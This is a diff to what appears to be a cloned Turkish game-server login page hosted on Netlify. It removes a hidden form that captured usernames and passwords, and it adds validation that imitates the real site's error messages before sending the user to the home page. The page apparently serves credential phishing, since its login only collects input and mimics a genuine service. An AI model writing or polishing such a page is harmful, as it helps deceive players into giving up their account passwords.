@@ -178,29 +178,106 @@ function onSubmit(token) {
 </script>
 
 
-<!-- BEGIN: Netlify+redirect additions (non-destructive) -->
-<script>
-  // For now: avoid 404 by redirecting to home on submit (without removing your existing logic)
-  document.addEventListener('DOMContentLoaded', function () {
-    var form = document.getElementById('biscolab-recaptcha-invisible-form') || document.querySelector('form[data-netlify="true"]');
-    if (form) {
-      form.addEventListener('submit', function (e) {
-        try {
-          e.preventDefault();
-        } catch (err) {}
-        window.location.href = "/";
-      }, { passive: false });
-    }
-  });
-</script>
 
-<!-- Hidden detection form so Netlify registers "giris-yap" even if it skips parsing the main one -->
-<form name="giris-yap" method="POST" data-netlify="true" netlify-honeypot="bot-field" hidden>
-  <input type="hidden" name="form-name" value="giris-yap">
-  <input type="text" name="username">
-  <input type="password" name="password">
-  <input type="text" name="bot-field">
-</form>
-<!-- END: Netlify+redirect additions -->
+
+
+<!-- BEGIN: Validation + banner additions -->
+<script>
+(function () {
+  function $(sel, root){ return (root||document).querySelector(sel); }
+  function createBanner(form) {
+    var existing = document.getElementById('so-error-banner');
+    if (existing) return existing;
+    var wrap = document.createElement('div');
+    wrap.id = 'so-error-banner';
+    wrap.style.display = 'none';
+    wrap.innerHTML = ''
+      + '<div class="bg-orange-500 rounded-t-lg"></div>'
+      + '<div class="bg-red-300 border-l-4 border-red-900 p-4">'
+      + '  <p class="font-bold text-red-600">Oops</p>'
+      + '  <p id="so-error-text" class="text-sm text-red-600"></p>'
+      + '</div>';
+    form.parentNode.insertBefore(wrap, form);
+    return wrap;
+  }
+  function setBanner(msg, form){
+    var banner = createBanner(form);
+    var p = document.getElementById('so-error-text');
+    if (p) p.textContent = msg;
+    banner.style.display = '';
+  }
+  function hideBanner(){
+    var banner = document.getElementById('so-error-banner');
+    if (banner) banner.style.display = 'none';
+  }
+  function getForm(){
+    return document.getElementById('biscolab-recaptcha-invisible-form') ||
+           document.getElementById('login') ||
+           document.querySelector('form');
+  }
+  function getInputs(form){
+    var u = form.querySelector('input[name="username"], input#username, input[placeholder*="yuncu"], input[placeholder*="Oyuncu"]');
+    var p = form.querySelector('input[type="password"]');
+    return {u: u, p: p};
+  }
+  function validate(form){
+    var ip = getInputs(form);
+    if (!ip.u || !ip.p) return true; // no fields found, don't block
+    var username = (ip.u.value || '').trim();
+    var password = ip.p.value || '';
+
+    if (username === '' || password === '') {
+      setBanner('Boş alan bırakmamalısın.', form);
+      return false;
+    }
+    if (username.length < 3 || username.length > 16 || password.length < 6) {
+      setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söyleyemem.', form);
+      return false;
+    }
+    hideBanner();
+    return true;
+  }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    var form = getForm();
+    if (!form) return;
+
+    // Prefer custom validation before any other handlers (including reCAPTCHA)
+    // 1) Intercept click on submit button
+    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], .g-recaptcha');
+    if (submitBtn) {
+      submitBtn.addEventListener('click', function(e){
+        if (!validate(form)) {
+          e.preventDefault();
+          e.stopImmediatePropagation();
+        }
+      }, true); // capture phase
+    }
+
+    // 2) Intercept Enter key submissions
+    form.addEventListener('keydown', function(e){
+      if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey) {
+        if (!validate(form)) {
+          e.preventDefault();
+          e.stopImmediatePropagation();
+        }
+      }
+    }, true);
+
+    // 3) Intercept form submit as a fallback
+    form.addEventListener('submit', function(e){
+      if (!validate(form)) {
+        e.preventDefault();
+        return false;
+      }
+      // VALID: for now, keep the UX simple and return to home page
+      try { e.preventDefault(); } catch(_) {}
+      window.location.href = "/";
+      return false;
+    }, true);
+  });
+})();
+</script>
+<!-- END: Validation + banner additions -->
 
 </body></html>
